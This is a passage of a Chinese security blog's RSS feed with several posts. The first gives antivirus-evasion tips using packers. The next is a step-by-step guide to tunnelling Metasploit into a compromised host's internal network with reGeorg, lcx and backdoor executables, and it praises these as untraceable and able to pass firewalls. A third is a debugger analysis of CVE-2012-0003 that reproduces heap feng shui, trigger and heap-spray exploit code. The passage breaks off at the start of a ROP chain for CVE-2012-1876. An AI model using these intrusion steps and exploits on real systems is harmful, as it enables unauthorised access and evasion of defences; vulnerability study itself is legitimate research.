&lt;/div&gt;
</description>
        <pubDate>Fri, 23 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2016/12/23/3xp10it%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B61.0/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/12/23/3xp10it%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B61.0/</guid>
        
        <category>web</category>
        
        <category>scan</category>
        
        <category>framework</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>免杀</title>
        <description>&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.https://green-m.github.io/2016/11/15/meterpreter-bypass-av/

2.http://down.52pojie.cn/Tools/Packers/中WinLicense_x32_x64_v2.3.9.0_Repacked.7z加壳后可成功bypass av,其他壳目
前未测试,应该有几个也可以,如果一个壳不行则加多个壳
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Wed, 21 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2016/12/21/%E5%85%8D%E6%9D%80/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/12/21/%E5%85%8D%E6%9D%80/</guid>
        
        <category>免杀</category>
        
        <category>bypass</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>代理msf进内网</title>
        <description>&lt;h3 id=&quot;0x01-场景&quot;&gt;0x01 场景&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.肉鸡网络为内网环境,假设肉鸡ip为192.168.130.111
2.肉鸡内网中有一台开启公网web服务机器,假设提供对应http://rouji.com,假设运行aspx
3.尝试将msf用肉鸡的内网代理来控制目标内网
4.msf控制端网络环境任意,可为内网,假设ip为192.168.3.166[此192.168与上面肉鸡的192.168不是同一个内网下的192.168]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-准备&quot;&gt;0x02 准备&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;步骤如下:
1.上传reGeorg的tunnel.aspx到http://rouji.com/tunnel.aspx
2.控制端本地运行:python reGeorg.py -u http://rouji.com/tunnel.aspx -p 1080
3.控制端[假设为kali系统]:
apt-get install tsocks
vi /etc/tsocks.conf配置server地址为127.0.0.1,端口为1080
tsocks msfconsole
4.两种控制模式:
a)reverse类型payload连接
b)bind类型payload连接
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-reverse类型payload&quot;&gt;0x03 Reverse类型payload&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.用msf生成一个reverse类型的exe,如下设置:
payload: windows/shell/reverse_tcp
rhost: 192.168.130.111[肉鸡本身的内网ip]
lport: 1234
假设生成houmen.exe

2.将lcx和上面生成的houmen.exe上传到肉鸡192.168.130.111,运行:
lcx -listen 300 1234
houmen.exe

3.在控制端msf中运行:
use multi/handler
set payload windows/shell/bind_tcp
set rhost 192.168.130.111
set lport 300
run -j

上面3个步骤完成后即可成功连接肉鸡

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x04-bind类型payload&quot;&gt;0x04 Bind类型payload&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.用msf生成一个bind类型的exe,如下设置:
payload: windows/shell/bind_tcp
lport: 1111
假设生成houmen.exe

2.将houmen.exe上传到肉鸡192.168.130.111,运行:
houmen.exe

3.在控制端msf中运行:
use multi/handler
set payload windows/shell/bind_tcp
set rhost 192.168.130.111
set lport 1111
run -j

上面3个步骤完成后即可成功连接肉鸡
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x05-about&quot;&gt;0x05 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;优点:
1.两种houmen.exe都无法溯源
2.两种houmen.exe都可尝试用在目标网络环境有防火墙拦截规则下正常通信,将所有与肉鸡的通信流量变成控制端与肉鸡内网的一台
web服务器的正常通信
3.msf控制端可直接访问肉鸡内网所有资源(正常情况下要在控制一台肉鸡后将肉鸡设置为路由转发才由本地msf访问肉鸡内网)

遗憾:
就算是这样做,msf中的一些欺骗模块(eg.auxiliary/spoof/nbns/nbns_response)和其他的需要肉鸡设置为待访问资源的
模块(eg.各种ie漏洞模块)在目标内网环境中依然没有用,因为为msf使用目标内网代理只是增加了msf对目标内网的访问权限,并
没有使msf有目标内网其他机器可以访问msf的功能
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 21 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2016/12/21/%E4%BB%A3%E7%90%86msf%E8%BF%9B%E5%86%85%E7%BD%91/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/12/21/%E4%BB%A3%E7%90%86msf%E8%BF%9B%E5%86%85%E7%BD%91/</guid>
        
        <category>msf</category>
        
        <category>proxy</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2012-0003</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;这个漏洞是由于微软的多媒体库winmm.dll(c:\windows\system32\winmm.dll)在处理MIDI文件时,由于对数据的处理不当导致的
堆溢出,攻击者可以在网页中嵌入特殊的MIDI文件来远程执行任意代码

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-准备工作&quot;&gt;0x01 准备工作&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;使用msf中的exp
    msfconsole
    search cve-2012-0003
    use exploit/windows/browser/ms12_004_midi
    set uripath test.html
    set payload windows/exec
    set cmd calc.exe
        server started
        http://192.168.118.129:8080/test.html
    奇怪的是在系统中不存在test.html,但是访问上面生成的网马链接确实会中马,后来查看msf中的exp:ms12_004_midi.rb,里
    面生成html的代码为
        send_response(cli, html, {'Content-Type'=&amp;gt;'text/html'})
    send_response函数在msfapi中有如下用法
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://rapid7.github.io/metasploit-framework/api/Msf/Exploit/Remote/HttpServer/HTML.html#send_response_html-instance_method&quot;&gt;msfapi_send_response&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    也即相当于msf内置webserver通过send_response函数发送html代码到客户端实现下面这个链接的访问
        http://192.168.118.129:8080/test.html
    这种方式比较特殊,可能msf的web是ruby的某个类似python下的Django的web框架开发的

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-调试分析&quot;&gt;0x02 调试分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;打开iexplore.exe
win+r:cmd
gflags -i iexplore.exe +hpa
    这里如果在windbg中设置!gflag +hpa不会成功,可能是winxp或是windbg的问题
windbg:f6附加iexplore.exe
!gflag
    0:016&amp;gt; !gflag
    Current NtGlobalFlag contents: 0x02000000
        hpa - Place heap allocations at ends of pages
g
ie打开http://192.168.118.129:8080/test.html
	(180.6f8): Access violation - code c0000005 (first chance)
	First chance exceptions are reported before any exception handling.
	This exception may be expected and handled.
	eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=16a7f019 edi=16a7cf60
	eip=76b2d224 esp=3685fe80 ebp=3685fea0 iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:16a7f019=??
    到这里只知道76b2d224处有内存访问异常,然而要想写出exp,还需要弄清参数传递过程,这个&quot;堆溢出&quot;cve的利用不是
    DWORD SHOOT,而是巧妙地构造html代码达到控制eip的目的,如果是利用堆溢出,一般会想到在上面访问异常时通过找到一个
    DWORD SHOOT的机会来覆盖异常处理相关的函数地址来控制eip,且要在可控数据复制到内存后找到堆分配调用

win+r:cmd
gflags -i iexplore.exe -hpa
bu WINMM!midiOutPlayNextPolyEvent
g
ie打开http://192.168.118.129:8080/test.html
    Breakpoint 0 hit
    eax=00000000 ebx=ffffffff ecx=7ffdf000 edx=00216790 esi=00216780 edi=002167d8
    eip=76b2d038 esp=0012e5b0 ebp=0012e5dc iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    WINMM!midiOutPlayNextPolyEvent:
    76b2d038 8bff            mov     edi,edi
    此时中断下来,再看看没有+hpa情况下的:WINMM!midiOutPlayNextPolyEvent+0x1ec会不会访问异常

bu WINMM!midiOutPlayNextPolyEvent+0x1ec
g
	Breakpoint 0 hit
	eax=00000251 ebx=0000007f ecx=007f2399 edx=00000000 esi=046de111 edi=025cd4f0
	eip=76b2d224 esp=0393fe80 ebp=0393fea0 iopl=0         nv up ei pl nz na po nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:046de111=00
	此时中断下来,看到这里的[esi]与上面异常访问时的[esi]不同,考虑到启用页堆是在堆块后增加专门用于检测溢出的栅栏
	页,以便在堆溢出触及栅栏页时立刻触发异常,而+hpa和-hpa的情况下[esi]不同,应该不是由于页堆造成的[esi]的不同,猜
	测是由于WINMM!midiOutPlayNextPolyEvent+0x1ec处要执行多遍,而刚开始执行到WINMM!midiOutPlayNextPolyEvent+0x1ec
	时[esi]处是可以访问的,只是msf中设置好的exp数据在后面某一次程序执行到WINMM!midiOutPlayNextPolyEvent+0x1ec时
	[esi]产生了变化,并在+hpa时,[esi]属于页堆增加的栅栏页的地址范围才导致+hpa时在某次执行到
	WINMM!midiOutPlayNextPolyEvent+0x1ec时造成访问异常,为了验证这个想法,进行如下操作:

关闭windbg
重新打开ie
cmd:
	gflags -i iexplore.exe +hpa
打开windbg,f6加载iexplore.exe

bu WINMM!midiOutPlayNextPolyEvent+0x1ec
bu WINMM!midiOutPlayNextPolyEvent
g
ie打开http://192.168.118.129:8080/test.html
	Breakpoint 1 hit
	eax=00000000 ebx=ffffffff ecx=7ff9d000 edx=16840f70 esi=16840f60 edi=16840fb8
	eip=76b2d038 esp=365bfbe0 ebp=365bfc0c iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent:
	76b2d038 8bff            mov     edi,edi
g
	Breakpoint 1 hit
	eax=00000000 ebx=ffffffff ecx=7ff98000 edx=16840f70 esi=16840f60 edi=16840fb8
	eip=76b2d038 esp=3690fea4 ebp=3690fedc iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent:
	76b2d038 8bff            mov     edi,edi
	这里看到WINMM!midiOutPlayNextPolyEvent第一次运行时不会经过+0x1ec的位置,在+1ec之前就返回了
g
	Breakpoint 0 hit
	eax=00000251 ebx=0000007f ecx=007f2399 edx=00000000 esi=16842e51 edi=16840f60
	eip=76b2d224 esp=3690fe80 ebp=3690fea0 iopl=0         nv up ei pl nz na po nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:16842e51=00
	这里看到第二次运行WINMM!midiOutPlayNextPolyEvent时第一次运行到+0x1ec处不会产生访问异常
g
	Breakpoint 0 hit
	eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=16843019 edi=16840f60
	eip=76b2d224 esp=3690fe80 ebp=3690fea0 iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:16843019=??
	这里看到第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处访问异常([esi]不识别),g即可验证
g
	(51c.674): Access violation - code c0000005 (first chance)
	First chance exceptions are reported before any exception handling.
	This exception may be expected and handled.
	eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=16843019 edi=16840f60
	eip=76b2d224 esp=3690fe80 ebp=3690fea0 iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:16843019=??
	这里可以看到的确是会触发异常的,也即+hpa时是第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处会
	访问异常,-hpa情况会怎样呢?进行如下操作验证:

关闭windbg,重新打开ie
gflags -i iexplore.exe -hpa
打开windbg,f6加载iexplore.exe
bu WINMM!midiOutPlayNextPolyEvent+0x1ec
bu WINMM!midiOutPlayNextPolyEvent
g
ie打开http://192.168.118.129:8080/test.html
	Breakpoint 1 hit
	eax=00000000 ebx=ffffffff ecx=7ffdf000 edx=0256aa28 esi=0256aa18 edi=0256aa70
	eip=76b2d038 esp=0012e5b0 ebp=0012e5dc iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent:
	76b2d038 8bff            mov     edi,edi
g
	Breakpoint 1 hit
	eax=00000000 ebx=ffffffff ecx=7ff98000 edx=0256aa28 esi=0256aa18 edi=0256aa70
	eip=76b2d038 esp=0392fea4 ebp=0392fedc iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent:
	76b2d038 8bff            mov     edi,edi
g
	Breakpoint 0 hit
	eax=00000251 ebx=0000007f ecx=007f2399 edx=00000000 esi=025cae59 edi=0256aa18
	eip=76b2d224 esp=0392fe80 ebp=0392fea0 iopl=0         nv up ei pl nz na po nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:025cae59=00
g
	Breakpoint 0 hit
	eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=025cb021 edi=0256aa18
	eip=76b2d224 esp=0392fe80 ebp=0392fea0 iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:025cb021=00
	可以看到-hpa情况下在第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处是不会产生访问异常的,结合
	+hpa的功能(定位导致漏洞的代码或函数)可知在第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处的
	这句指令将导致产生&quot;堆溢出&quot;

u .
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]
	76b2d226 8ad0            mov     dl,al
	76b2d228 740c            je      WINMM!midiOutPlayNextPolyEvent+0x1fe (76b2d236)
	76b2d22a 80e2f0          and     dl,0F0h
	76b2d22d 80faf0          cmp     dl,0F0h
	76b2d230 742d            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d232 0410            add     al,10h
	76b2d234 eb0a            jmp     WINMM!midiOutPlayNextPolyEvent+0x208 (76b2d240)
	看到的不多,扩大汇编指令范围

u eip-30 eip+30
	WINMM!midiOutPlayNextPolyEvent+0x1bc:
	76b2d1f4 e2f0            loop    WINMM!midiOutPlayNextPolyEvent+0x1ae (76b2d1e6)
	76b2d1f6 80fa90          cmp     dl,90h
	76b2d1f9 8855ff          mov     byte ptr [ebp-1],dl
	76b2d1fc 7405            je      WINMM!midiOutPlayNextPolyEvent+0x1cb (76b2d203)
	76b2d1fe 80fa80          cmp     dl,80h
	76b2d201 755c            jne     WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d203 0fb6550b        movzx   edx,byte ptr [ebp+0Bh]
	76b2d207 83e00f          and     eax,0Fh
	76b2d20a c1e007          shl     eax,7
	76b2d20d 03c2            add     eax,edx
	76b2d20f 99              cdq
	76b2d210 2bc2            sub     eax,edx
	76b2d212 d1f8            sar     eax,1
	76b2d214 807dff80        cmp     byte ptr [ebp-1],80h
	76b2d218 742a            je      WINMM!midiOutPlayNextPolyEvent+0x20c (76b2d244)
	76b2d21a 84db            test    bl,bl
	76b2d21c 7426            je      WINMM!midiOutPlayNextPolyEvent+0x20c (76b2d244)
	[***]76b2d21e 03f0            add     esi,eax
	76b2d220 f6450b01        test    byte ptr [ebp+0Bh],1
	[==============&amp;gt;eip]76b2d224 8a06            mov     al,byte ptr [esi]
	76b2d226 8ad0            mov     dl,al
	76b2d228 740c            je      WINMM!midiOutPlayNextPolyEvent+0x1fe (76b2d236)
	76b2d22a 80e2f0          and     dl,0F0h
	76b2d22d 80faf0          cmp     dl,0F0h
	76b2d230 742d            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d232 0410            add     al,10h
	76b2d234 eb0a            jmp     WINMM!midiOutPlayNextPolyEvent+0x208 (76b2d240)
	76b2d236 80e20f          and     dl,0Fh
	76b2d239 80fa0f          cmp     dl,0Fh
	76b2d23c 7421            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	[***]76b2d23e fec0            inc     al
	[***]76b2d240 8806            mov     byte ptr [esi],al
	76b2d242 eb1b            jmp     WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d244 f6450b01        test    byte ptr [ebp+0Bh],1
	76b2d248 8d1430          lea     edx,[eax+esi]
	76b2d24b 8a02            mov     al,byte ptr [edx]
	76b2d24d 7408            je      WINMM!midiOutPlayNextPolyEvent+0x21f (76b2d257)
	76b2d24f a8f0            test    al,0F0h
	76b2d251 740c            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d253 2c10            sub     al,10h
	在当前eip处eax=0x419,而eip最近执行过的与eax相关的指令为76b2d21e处的add esi,eax,书中分析的是此处的esi来源于
	winmmAlloc(0x400)分配到的内存地址,而add esi,eax中的eax=0x419超过了分配的0x400导致访问到超出0x19大小处的内容
	,在eip下面的76b2d23e和76b2d240处可以看到,[esi]的值会加1,也即在超出0x19大小处的内存中的内容会加1,这就是这个
	漏洞的危害:导致内存某处的值+1,只要能够控制这个0x19处的内存的内容,就有机会利用这个漏洞.

	上面之所以会有76b2d240处的导致[esi]加1的出现,是要在mid文件中的某个音轨事件处写上&quot;打开音符&quot;对应的值
	(书中是0x0073b29f),如下||之间的内容

	00000000: 4d54 6864 0000 0006 0000 0001 0060 4d54  MThd.........`MT
	00000010: 726b 0000 0035 00ff 030d 4472 756d 7320  rk...5....Drums 
	00000020: 2020 2842 4229 0000 c928 00b9 0764 00b9    (BB)...(...d..
	00000030: 0a40 00b9 7b00 00b9 5b28 00b9 5d00 8550  .@..{...[(..]..P
	00000040: 9923 7f00|9fb2 7300|ff2f 000a            .#....s../..

	满足mid文件中对应位置处的值为&quot;打开音符&quot;后,会导致在当前eip环境下的[esi]加1,也即76b2d21e执行后的[esi]加1,也即
	winAlloc(0x400)分配到的内存地址+0x19处的内容加1,而利用方式中正好是利用相应内存中的值加1导致任意代码执行.书
	中通过ida的f5分析函数调用与参数传递分析得到上面的esi的源是winmmAlloc(0x400),也即在打开mid文件后会有一个这样
	的内存分配动作,于是构造出如下结构的内存空间使得winmmAlloc(0x400)分到的内存地址相对可控:
	|xxxxxxxx|oooooooo|xxxxxxxxx|ooooooooo|xxxxxxxxx|ooooooooo|...
	也即在mid文件被ie解析之前,先用js构造上面这样的内存格式,其中xxx表示有数据,ooo表示空闲内存,每个||之间的内存大
	小正好为0x400,这样在上面内存结构的基础上再由ie解析mid文件而产生winmmAlloc(0x400)的动作就会分配到上面的ooo的
	某个位置上,然后由于mid文件是特殊的构造好的会使winmmAlloc(0x400)分到的内存地址+0x19处的内存的内容加1的文件,
	于是ie解析mid文件后,将导致winmmAlloc(0x400)分到的某个ooo位置的右边一个xxx的位置上的偏移0x19中的值加1,当上面
	构造的特殊内存格式时构造好该位置内容的值+1会使得代码执行时,就可以利用这个漏洞了,而书中(msf)的利用方式是用下
	面的js来达到目的的:

	[msf中的构造特殊内存结构的由ruby写的js]
    def build_element(element_name, my_target, type=&quot;corruption&quot;)
      dst = Rex::Text.to_unescape([my_target['DispatchDst']].pack(&quot;V&quot;))
      element = ''
  
      if my_target.name =~ /IE 8/
        max   = 63   # Number of attributes for IE 8
        index = 1    # Where we want to confuse the type
      else
        max   = 55   # Number of attributes for before IE 8
        index = 0    # Where we want to confuse the type
      end
  
      element &amp;lt;&amp;lt; &quot;var #{element_name} = document.createElement(\&quot;select\&quot;)&quot; + &quot;\n&quot;
  
      # Build attributes
      0.upto(max) do |i|
        case type
          when &quot;corruption&quot;
            obj = (i==index) ? &quot;unescape(\&quot;#{dst}\&quot;)&quot; : &quot;alert&quot;
          else #leak
            obj = &quot;alert&quot;
        end
        element &amp;lt;&amp;lt; &quot;#{element_name}.w#{i.to_s} = #{obj}&quot; + &quot;\n&quot;
      end
  
      return element
    end

    # Feng Shui and triggering Steps:
    # 1. Run the garbage collector before allocations
    # 2. Defragment the heap and alloc CImplAry objects in one step (objects size are IE version dependent)
    # 3. Make holes
    # 4. Let windows media play the crafted midi file and corrupt the heap
    # 5. Force the using of the confused tagVARIANT.
    def build_trigger(my_target, type=&quot;corruption&quot;)
      js_trigger = build_trigger_fn(my_target, type)
      select_element = build_element('selob', my_target, type)
  
      trigger = &amp;lt;&amp;lt;-JS
        var heap = new heapLib.ie();
        #{select_element}
        var clones = new Array(1000);
  
        function feng_shui() {
          heap.gc();
  
          var i = 0;
          while (i &amp;lt; 1000) {
            clones[i] = selob.cloneNode(true)
            i = i + 1;
          }
  
          var j = 0;
          while (j &amp;lt; 1000) {
            delete clones[j];
            CollectGarbage();
            j  = j + 2;
          }
        }
  
        feng_shui();
  
        #{js_trigger}
      JS
  
      trigger = heaplib(trigger, {:noobfu =&amp;gt; true})
      return trigger
    end

	上面msf中的代码对应书中的如下代码:
	var selob=document.createElement(&quot;select&quot;)
	selob.w0=alert
	selob.w1=unescape(&quot;%u0c0c %u0c0c&quot;)
	selob.w2=alert
	selob.w3=alert
	selob.w4=alert
	selob.w5=alert
	...
	...
	selob.w63=alert

	var clones=new Array(1000)
	
	function feng_shui(){

	var i=0
	while (i&amp;lt;1000){
	clones[i]=selob.cloneNode(true)
	i=i+1
	}

	var j=0
	while(j&amp;lt;1000){
	delete clones[j]
	CollectGarbage()
	j=j+2
	}
	}

	上面为了达到某处内容值+1得到控制代码执行的目的使用的是:
	创建select元素selob,设置64个属性,其中w1为string类型,其余为object类型,然后创建一个数组用来存放1000个selob元
	素,然后间隔释放1000个selob元素中的500个元素,然后由于ie解析mid文件,运行了winmmAlloc(0x400),得到的分配地址位
	于某个释放的selob元素的位置,由于mid文件中某处已经构造好了音轨事件是&quot;打开音符&quot;,于是会使得某个selob元素的+19
	位置的值+1,于是该selob元素的第二个属性w1由string变成object,然后由下面的js来触发这个变成object的属性相应函数
	的执行,触发js如下:

	function trigger(){
	var k=999
	while (k&amp;gt;0){
	if (typeof(clones[k].w1)==&quot;string&quot;){
	}else{
	clone[k].w1('come on!')
	}
	
	k=k-2
	}
	feng_shui()
	document.audio.Play()
	}

	上面的js中的函数trigger由下面的js调用执行(执行trigger函数在ie解析mid文件之后[也即在上面的
	document.audio.Play执行之后]):

	&amp;lt;/script&amp;gt;
	&amp;lt;script for=audio event=PlayStateChange(oldState,newState)&amp;gt;
		if (oldState == 3 &amp;amp;&amp;amp; newState == 0) {
			trigger();
		}
	&amp;lt;/script&amp;gt;

	在js构造的string变成object的属性时执行的函数的地址为0x0c0c0c0c是堆喷射的利用地址,对应msf中的构造堆喷射内存
	布局的代码如下:

    def build_spray(my_target, leak=0)
  
      # Extract string based on target
      if my_target.name == 'IE 8 on Windows XP SP3'
        js_extract_str = &quot;var block = shellcode.substring(2, (0x40000-0x21)/2);&quot;
      else
        js_extract_str = &quot;var block = shellcode.substring(0, (0x80000-6)/2);&quot;
      end
  
      # Build shellcode based on Rop requirement
      code = ''
      if my_target['Rop'] and datastore['MSHTML'].to_s != ''
        print_status(&quot;Generating ROP using info-leak: 0x#{leak.to_s(16)}&quot;)
        code &amp;lt;&amp;lt; create_info_leak_rop(my_target, leak)
        code &amp;lt;&amp;lt; payload.encoded
      elsif my_target['Rop'] and datastore['MSHTML'].to_s == ''
        print_status(&quot;Generating ROP using msvcrt&quot;)
        code &amp;lt;&amp;lt; create_rop(my_target, payload.encoded)
      else
        code &amp;lt;&amp;lt; payload.encoded
      end
  
      shellcode = Rex::Text.to_unescape(code)
  
      # 1. Create  big block of nops
      # 2. Compose one block which is nops + shellcode
      # 3. Repeat the block
      # 4. Extract string from the big block
      # 5. Spray
      spray = &amp;lt;&amp;lt;-JS
      var heap_obj = new heapLib.ie(0x10000);
  
      var code = unescape(&quot;#{shellcode}&quot;);
      var nops = unescape(&quot;%u0c0c%u0c0c&quot;);
  
      while (nops.length &amp;lt; 0x1000) nops+= nops;
      var shellcode =  nops.substring(0,0x800 - code.length) + code;
      while (shellcode.length &amp;lt; 0x40000) shellcode += shellcode;
  
      #{js_extract_str}
  
      heap_obj.gc();
      for (var i=0; i &amp;lt; 600; i++) {
        heap_obj.alloc(block);
      }
  
      JS
  
      spray = heaplib(spray, {:noobfu =&amp;gt; true})
      return spray
    end
  	  		
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-小结&quot;&gt;0x03 小结&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;漏洞场景:
程序(iexplore.exe)解析特殊构造的文件(mid)时,在内存中可找到有内存分配动作(winmmAlloc),分配的内存大小一定
(0x400),如果解析特殊文件(mid中音轨事件为打开音符)会使程序在分配到的内存地址范围之外(0x419&amp;gt;0x400)有改变
大小动作(使0x419偏移处的值+1)

利用方法:
可以通过与这里相同的js的构造特殊内存结构的方法来利用这个改变动作来控制eip.

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;首发于安全客,版权归安全客所有,http://bobao.360.cn/learning/detail/3278.html&lt;/p&gt;
</description>
        <pubDate>Fri, 09 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-0003/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-0003/</guid>
        
        <category>漏洞战争</category>
        
        <category>漏洞分析</category>
        
        <category>堆溢出</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2012-1876</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;目标:Internet Explorer 8
目的:利用js绕过dep+aslr
漏洞源:MSHTML.dll
漏洞情况:
	Microsoft Internet Explorer 6到11没有正确处理内存中的对象,这允许远程攻击者通过尝试访问不存在的对象来执行任
	意代码,导致基于堆的缓冲区溢出,也称为&quot;Col元素远程代码执行漏洞&quot;,其中ie9以上采用Nozzle保护机制,会阻止BSTR的分
	配,在ie9以上利用方法可参考keenteam的使用VBScript中的toArray()方法,本文中为Jscript的方法
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;分析&quot;&gt;分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;书中在绕过dep的+aslr的时候有两次溢出,第一次是为了得到mshtml.dll的基址以便构造rop gadgets绕过dep,但是在msf的exp中
没有这个步骤,msf直接使用msvcrt.dll或jre.dll来绕过dep,尝试在实际环境中用mona获取msvcrt.dll的rop gadgets,发现获得
的rop gadgets结果与msf中的并不一致,如下:
msf的exp中的rop:

	  when :msvcrt
        print_status(&quot;Using msvcrt ROP&quot;)
        exec_size = code.length
        rop =
          [
            0x77c4ec01, # retn
